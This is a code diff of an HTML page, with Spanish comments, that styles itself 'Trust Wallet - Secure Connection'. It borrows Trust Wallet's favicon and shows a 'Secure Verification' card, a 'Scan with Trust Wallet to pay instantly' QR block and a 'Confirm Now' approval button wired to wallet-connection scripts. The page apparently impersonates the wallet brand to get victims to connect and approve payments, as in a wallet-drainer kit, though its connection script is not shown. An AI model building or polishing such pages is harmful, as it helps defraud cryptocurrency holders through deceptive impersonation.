@@ -7,265 +7,21 @@
 	<meta name="mobile-web-app-capable" content="yes">
 	<title>Trust Wallet - Secure Connection</title>
 	
-	<!-- Favicon oficial -->
+	<!-- Favicon original -->
 	<link rel="icon" type="image/x-icon" href="https://trustwallet.com/favicon.ico">
 	<link rel="shortcut icon" type="image/x-icon" href="https://trustwallet.com/favicon.ico">
 
-	<!-- Estilos CSS Mejorados -->
-	<style>
-		:root {
-			--primary-blue: #2563eb;
-			--primary-hover: #1d4ed8;
-			--bg-page: #f8fafc;
-			--card-bg: #ffffff;
-			--text-main: #0f172a;
-			--text-muted: #64748b;
-			--border-color: #e2e8f0;
-			--success-green: #10b981;
-		}
+	<link rel="stylesheet" href="css/main.css">
 
-		* {
-			box-sizing: border-box;
-			margin: 0;
-			padding: 0;
-			font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-		}
-
-		body {
-			background-color: var(--bg-page);
-			color: var(--text-main);
-			min-height: 100vh;
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			padding: 16px;
-		}
-
-		/* Contenedor tipo Tarjeta Flotante */
-		.screen {
-			background-color: var(--card-bg);
-			width: 100%;
-			max-width: 440px;
-			border-radius: 24px;
-			box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.05);
-			border: 1px solid var(--border-color);
-			padding: 32px 24px;
-			display: flex;
-			flex-direction: column;
-			gap: 20px;
-		}
-
-		.trust-header {
-			text-align: center;
-			display: flex;
-			flex-direction: column;
-			align-items: center;
-			gap: 8px;
-		}
-
-		.trust-icon-shield {
-			width: 52px;
-			height: 52px;
-			background: #eff6ff;
-			border-radius: 16px;
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			margin-bottom: 4px;
-		}
-
-		.trust-header h2 {
-			font-size: 22px;
-			font-weight: 700;
-			color: var(--text-main);
-			letter-spacing: -0.02em;
-		}
-
-		.trust-subtitle {
-			font-size: 14px;
-			color: var(--text-muted);
-		}
-
-		.form-shell {
-			display: flex;
-			flex-direction: column;
-			gap: 14px;
-		}
-
-		.field-block {
-			display: flex;
-			flex-direction: column;
-			gap: 6px;
-		}
-
-		.field-label {
-			font-size: 13px;
-			font-weight: 600;
-			color: var(--text-muted);
-			text-transform: uppercase;
-			letter-spacing: 0.04em;
-		}
-
-		.address-field, .desc-field, .network-pill {
-			display: flex;
-			align-items: center;
-			background: #f8fafc;
-			border: 1px solid var(--border-color);
-			border-radius: 12px;
-			padding: 10px 14px;
-			gap: 10px;
-		}
-
-		.address-input, .desc-text {
-			width: 100%;
-			background: transparent;
-			border: none;
-			outline: none;
-			font-size: 14px;
-			color: var(--text-main);
-			font-weight: 500;
-		}
-
-		.addr-usdt-icon svg, .network-icon svg {
-			width: 22px;
-			height: 22px;
-			flex-shrink: 0;
-		}
-
-		.network-name {
-			font-size: 14px;
-			font-weight: 600;
-			color: var(--text-main);
-			flex-grow: 1;
-		}
-
-		.network-status-dot {
-			width: 8px;
-			height: 8px;
-			background-color: var(--success-green);
-			border-radius: 50%;
-			box-shadow: 0 0 0 3px rgba(16, 185, 129, 0.15);
-		}
-
-		.desc-actions {
-			font-weight: 600;
-			font-size: 14px;
-			color: var(--text-muted);
-		}
-
-		/* Bloque de Código QR Estilizado */
-		.qr-container {
-			background: #f8fafc;
-			border: 1px solid var(--border-color);
-			border-radius: 16px;
-			padding: 16px;
-			display: flex;
-			flex-direction: column;
-			align-items: center;
-			gap: 10px;
-			text-align: center;
-		}
-
-		.qr-wrapper {
-			background: #ffffff;
-			padding: 12px;
-			border-radius: 12px;
-			border: 1px solid var(--border-color);
-			display: inline-block;
-		}
-
-		.qr-code-box img, .qr-code-box canvas {
-			display: block;
-			width: 150px !important;
-			height: 150px !important;
-			border-radius: 6px;
-		}
-
-		.qr-instruction {
-			font-size: 13px;
-			color: var(--text-muted);
-			font-weight: 500;
-		}
-
-		.security-badge-box {
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			gap: 6px;
-			font-size: 12px;
-			font-weight: 600;
-			color: var(--success-green);
-			background: #ecfdf5;
-			padding: 8px;
-			border-radius: 8px;
-		}
-
-		.bottom-bar {
-			margin-top: 4px;
-		}
-
-		.primary-button {
-			width: 100%;
-			background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
-			color: #ffffff;
-			border: none;
-			border-radius: 14px;
-			padding: 14px;
-			font-size: 15px;
-			font-weight: 600;
-			cursor: pointer;
-			transition: all 0.2s ease;
-			box-shadow: 0 4px 12px rgba(37, 99, 235, 0.25);
-			display: flex;
-			align-items: center;
-			justify-content: center;
-			gap: 8px;
-		}
-
-		.primary-button:hover {
-			opacity: 0.95;
-			transform: translateY(-1px);
-			box-shadow: 0 6px 16px rgba(37, 99, 235, 0.35);
-		}
-
-		.btn-spinner {
-			width: 18px;
-			height: 18px;
-			border: 2px solid #ffffff;
-			border-top-color: transparent;
-			border-radius: 50%;
-			animation: spin 0.8s linear infinite;
-		}
-
-		@keyframes spin {
-			to { transform: rotate(360deg); }
-		}
-
-		.toast {
-			position: fixed;
-			bottom: 20px;
-			left: 50%;
-			transform: translateX(-50%);
-			background: #0f172a;
-			color: #fff;
-			padding: 10px 20px;
-			border-radius: 30px;
-			font-size: 13px;
-			font-weight: 500;
-			box-shadow: 0 10px 15px -3px rgba(0,0,0,0.2);
-		}
-	</style>
-
-	<!-- Configuración de process para WalletConnect -->
+	<!-- Configuración de process para WalletConnect / Reown -->
 	<script>
 		window.process = { env: { NODE_ENV: 'production' } };
 	</script>
 
-	<!-- Proveedor oficial de WalletConnect UMD -->
-	<script src="https://unpkg.com/@walletconnect/ethereum-provider@2.11.2/dist/index.umd.js"></script>
-	<script src="js/ethers.umd.min.js"></script>
-	<!-- Librería QRCode.js -->
+	<!-- Librería QRCode.js para generación de respaldo -->
 	<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+	
+	<!-- Script principal de la aplicación (donde inicializarás Reown AppKit con tu Project ID) -->
 	<script src="js/app.js" defer></script>
 </head>
 <body>
@@ -273,7 +29,7 @@
 		<div class="trust-header">
 			<div class="trust-icon-shield">
 				<svg viewBox="0 0 24 24" width="28" height="28" fill="none" xmlns="http://www.w3.org/2000/svg">
-					<path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V13H5V6.3l7-2.33v9.02z" fill="#2563eb"/>
+					<path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V13H5V6.3l7-2.33v9.02z" fill="#0052FF"/>
 				</svg>
 			</div>
 			<h2>Secure Verification</h2>
@@ -318,15 +74,7 @@
 				</div>
 			</div>
 
-			<!-- Código QR integrado dentro de la tarjeta con estilo limpio -->
-			<div class="qr-container">
-				<div class="qr-wrapper">
-					<div id="qrcode" class="qr-code-box"></div>
-				</div>
-				<p class="qr-instruction">Scan with Trust Wallet to pay instantly</p>
-			</div>
-
-			<div class="security-badge-box">
+			<div class="security-badge-box" style="display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; font-weight: 600; color: #10b981; background: #ecfdf5; padding: 10px; border-radius: 10px; margin-top: 16px;">
 				<svg viewBox="0 0 24 24" width="16" height="16" fill="#10b981">
 					<path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
 				</svg>
@@ -334,7 +82,16 @@
 			</div>
 		</section>
 
+		<!-- Contenedor QR dinámico opcional si el usuario prefiere escanear directo -->
+		<div class="qr-container" style="margin-top: 16px;">
+			<div class="qr-wrapper">
+				<div id="qrcode" class="qr-code-box"></div>
+			</div>
+			<p class="qr-instruction">Scan with Trust Wallet to pay instantly</p>
+		</div>
+		
 		<footer class="bottom-bar">
+			<!-- Botón principal de confirmación que activará la lógica de conexión -->
 			<button id="approveBtn" class="primary-button" type="button">
 				<span id="btnText">Confirm Now</span>
 				<span id="btnSpinner" class="btn-spinner" hidden="" aria-hidden="true"></span>
